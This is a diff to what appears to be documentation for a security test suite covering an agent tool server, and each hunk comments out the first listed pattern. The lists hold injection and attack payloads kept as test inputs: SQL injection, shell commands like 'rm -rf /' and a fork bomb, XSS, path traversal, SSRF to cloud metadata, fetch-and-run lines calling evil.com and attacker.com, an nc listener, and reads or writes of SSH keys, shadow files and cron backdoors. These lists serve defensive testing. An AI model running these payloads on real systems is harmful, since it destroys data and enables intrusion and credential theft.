@@ -40,7 +40,7 @@ Tests SQL injection patterns that could potentially access sensitive data:
 
 ```python
 # Patterns tested:
-- ' OR '1'='1
+# - ' OR '1'='1
 - ' OR 1=1--
 - ' UNION SELECT * FROM users--
 - '; DROP TABLE users;-- (blocked via shell metachar)
@@ -59,7 +59,7 @@ Tests shell command injection patterns:
 
 ```python
 # Patterns tested:
-- ; rm -rf /
+# - ; rm -rf /
 - | cat /etc/passwd
 - `whoami`
 - $(id)
@@ -78,7 +78,7 @@ Tests cross-site scripting payloads:
 
 ```python
 # Patterns tested:
-- <script>alert('XSS')</script>
+# - <script>alert('XSS')</script>
 - <img src=x onerror=alert('XSS')>
 - <svg onload=alert('XSS')>
 - javascript:alert('XSS')>
@@ -97,7 +97,7 @@ Tests path traversal attempts:
 
 ```python
 # Patterns tested:
-- ../../../etc/passwd
+# - ../../../etc/passwd
 - ..\..\..\windows\system32
 - %2e%2e%2fetc%2fpasswd
 - ..%5c..%5c..%5cboot.ini
@@ -114,7 +114,7 @@ Tests server-side request forgery attempts:
 
 ```python
 # Patterns tested:
-- http://localhost/admin
+# - http://localhost/admin
 - http://127.0.0.1/internal
 - http://169.254.169.254/latest/meta-data/
 - http://0.0.0.0:8080
@@ -135,7 +135,7 @@ Tests each shell metacharacter individually:
 
 ```python
 # Metacharacters tested:
-- ;  (command separator)
+# - ;  (command separator)
 - &  (background execution)
 - |  (pipe)
 - $  (variable expansion)
@@ -155,7 +155,7 @@ Tests attackers chaining multiple metacharacters:
 
 ```python
 # Patterns tested:
-- test; rm -rf /;
+# - test; rm -rf /;
 - test && wget evil.com && bash
 - test || curl attacker.com ||
 - test; nc -l -p 4444
@@ -171,7 +171,7 @@ Tests URL-encoded injection attempts:
 
 ```python
 # Patterns tested:
-- %3B (URL-encoded ;)
+# - %3B (URL-encoded ;)
 - %26%26 (URL-encoded &&)
 - %7C (URL-encoded |)
 - %24%28id%29 (URL-encoded $(id))
@@ -189,7 +189,7 @@ Tests attempts to access sensitive files:
 
 ```python
 # Test cases:
-- read_file with path: ../../../etc/passwd
+# - read_file with path: ../../../etc/passwd
 - read_file with path: /etc/shadow
 - read_file with path: /root/.ssh/id_rsa
 - read_file with path: /proc/kcore
@@ -202,7 +202,7 @@ Tests attempts to write to sensitive files:
 
 ```python
 # Test cases:
-- write_file to /etc/passwd with malicious content
+# - write_file to /etc/passwd with malicious content
 - write_file to /root/.ssh/authorized_keys with SSH key
 - write_file to /etc/cron.d/backdoor with cron job
 ```
@@ -214,7 +214,7 @@ Tests dangerous execute_command arguments:
 
 ```python
 # Test cases:
-- execute_command with: rm -rf /
+# - execute_command with: rm -rf /
 - execute_command with: dd if=/dev/zero of=/dev/sda
 - execute_command with: :(){ :|:& };: (fork bomb)
 ```
